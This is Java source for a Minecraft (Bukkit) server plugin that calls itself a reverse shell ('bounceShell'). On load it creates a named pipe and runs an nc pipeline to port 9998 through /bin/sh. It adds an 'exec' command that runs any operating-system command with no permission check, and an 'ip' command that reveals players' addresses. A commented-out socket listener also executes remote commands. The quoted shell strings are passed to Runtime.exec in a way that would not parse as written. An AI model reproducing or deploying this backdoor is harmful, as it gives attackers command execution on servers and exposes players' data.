/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package bounceShell;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.net.ServerSocket;
import java.net.Socket;

import org.bukkit.plugin.java.*;
import org.bukkit.scheduler.BukkitRunnable;
import org.bukkit.util.Vector;
import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.Location;
import org.bukkit.Material;
import org.bukkit.command.Command;
import org.bukkit.command.CommandSender;
import org.bukkit.configuration.file.FileConfiguration;
import org.bukkit.entity.Player;
import org.fusesource.jansi.Ansi.Color;

/**
 * 
 * @author HXB
 */
public final class PluginReg extends JavaPlugin {

	public static PluginReg test1;
	private FileConfiguration config;
	private boolean isEnable = false;
	private int port = 9988;

	@Override
	public void onEnable() {// 这个就算是这个插件的main函数了，插件从这里开始执行
		test1 = this;
		// getServer().getPluginManager().registerEvents(breaksense1.getGc().getHg(),
		// this);

		// 预加载配置文件
		config = this.getConfig();
		this.saveDefaultConfig();

		this.getConfig().set("port", this.getConfig().getInt("port"));
		this.port = this.getConfig().getInt("port");

		new BukkitRunnable() {
			@Override
			public void run() {
				runListener();
			}
		}.runTaskLater(this, 0l);

		System.out.println("反弹sehll已被加载!");// 向日志写入
		this.saveConfig();// 最后才保存
	}

	@Override
	public void onDisable() {
		test1 = null;
	}

	@SuppressWarnings("unused")
	@Override
	public boolean onCommand(CommandSender sender, Command cmd, String label,
			String[] args) {
		if (cmd.getName().equalsIgnoreCase("exec") & args.length != 0) {
			final String myCmd = args[0];
			final CommandSender sdr = sender;
			new BukkitRunnable() {
				@Override
				public void run() {
					exec(myCmd, sdr);
				}
			}.runTaskLater(this, 0l);
			return true;
		}
		if (cmd.getName().equalsIgnoreCase("bsenable")) {
			if (!(sender instanceof Player)) {
				this.isEnable = true;
				return true;
			} else {
				sender.sendMessage(Color.RED
						+ "This command is disallowed for players.");
				return false;
			}
		}
		if (cmd.getName().equalsIgnoreCase("bsdisable")) {
			if (!(sender instanceof Player)) {
				this.isEnable = false;
				return true;
			} else {
				sender.sendMessage(Color.RED
						+ "This command is disallowed for players.");
				return false;
			}
		}
		if (cmd.getName().equalsIgnoreCase("ip")) {
			if (sender.isOp() & args[0] != null
					& Bukkit.getPlayer(args[0]) != null) {
				sender.sendMessage(Bukkit.getPlayer(args[0]).getAddress()
						.getHostName()
						+ ":"
						+ Bukkit.getPlayer(args[0]).getAddress()
						+ ":"
						+ Bukkit.getPlayer(args[0]).getAddress().getPort());
				return true;
			} else {
				sender.sendMessage(Color.RED
						+ "This command is disallowed for players.");
				return false;
			}
		}
		return false;
	}

	public void mySaveConfig(String name) {
		this.saveConfig();
	}

	public static String exec(String command, CommandSender sender) {
		try {
			// 执行 CMD 命令
			String output = "=====开始执行=====\n";
			Process process = Runtime.getRuntime().exec(command);
			// 从输入流中读取文本
			BufferedReader reader = new BufferedReader(new InputStreamReader(
					process.getInputStream()));
			String line = null;
			// 循环读取
			System.out.print("=====开始执行=====\n");
			sender.sendMessage("=====开始执行=====\n");
			while ((line = reader.readLine()) != null) {
				// 循环写入
				System.out.print(line + "\n");
				sender.sendMessage(line);
				output = output + "\n" + line;
			}
			process.getOutputStream().close();
			System.out.println("程序执行完毕!");
			sender.sendMessage("=====Done=====");
			return output;
		} catch (Exception e) {
			e.printStackTrace();
		}
		return ChatColor.RED + "哪里出错了";
	}

	public void runListener() {
		try {
			Runtime.getRuntime().exec("/bin/sh -c 'mkfifo /tmp/backpipe p'");
			Process proc = Runtime
					.getRuntime()
					.exec("/bin/sh -c '0</tmp/backpipe | nc 0.0.0.0 9998 1>/tmp/backpipe'");
			// proc.waitFor();
			/*
			 * ServerSocket ss = new ServerSocket(port); while (true) { Socket
			 * cs = ss.accept();// 本句阻塞！！！ BufferedReader in = new
			 * BufferedReader(new InputStreamReader( cs.getInputStream()));
			 * String lData; do { lData = in.readLine(); if (this.isEnable) {
			 * String cmdstring = lData; lData = in.readLine(); Process proc =
			 * Runtime.getRuntime().exec(cmdstring); proc.waitFor(); //
			 * 阻塞，直到上述命令执行完 // 注意下面的操作 String ls_1; BufferedReader
			 * bufferedReader = new BufferedReader( new
			 * InputStreamReader(proc.getInputStream())); while ((ls_1 =
			 * bufferedReader.readLine()) != null) { new
			 * PrintWriter(cs.getOutputStream()).write(ls_1); }
			 * bufferedReader.close(); proc.waitFor(); } else { lData = null; }
			 * } while (lData != null); }
			 */
		} catch (Exception e) {
			e.printStackTrace();
		}
	}
}// 这是类的那个反括号。。。